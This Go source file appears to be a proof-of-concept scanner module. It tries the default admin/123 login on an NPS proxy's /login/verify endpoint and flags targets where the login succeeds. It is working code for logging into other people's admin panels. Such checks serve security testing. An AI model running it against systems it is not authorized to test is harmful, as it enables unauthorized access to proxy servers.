package poc

import (
	"bytes"
	"io"
	"net/http"
)

// npc_default_passwd nps默认账号密码admin/123
func nps_default_passwd(url string) {
	url += "/login/verify"
	var data = []byte(`username=admin&password=123`)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Set("Connection", "close")

	resp, err := newRequest(req)
	if err != nil {
		return
	}

	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 && bytes.Contains(body, []byte("login success")) {
		flags := Flagcve{
			url:  url,
			cve:  "NPS代理默认账号密码",
			flag: "登录方式:Admin/123",
		}
		echoFlag(flags)
	}
}
